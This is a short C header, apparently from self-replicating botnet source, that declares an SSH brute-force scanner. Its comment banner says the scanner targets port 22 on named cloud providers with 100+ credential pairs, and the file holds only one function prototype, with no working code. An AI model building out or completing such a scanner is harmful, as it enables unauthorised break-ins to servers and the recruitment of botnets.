#ifndef _SSH_H
#define _SSH_H

/* ============================================================================
 * SSH BRUTE-FORCE SCANNER - Cloud Provider Targeting (Port 22)
 * ============================================================================
 * Protocol: Proper SSH handshake with key exchange
 * Targets: Cloud providers (AWS, DigitalOcean, Linode, Vultr, OVH, Hetzner)
 * Credentials: 100+ username/password combinations
 * Global: All regions with cloud infrastructure
 * ============================================================================ */

#include "includes.h"

#ifdef SELFREP

/* SSH scanner function prototypes */
void ssh_scanner_init(void);

#endif

#endif
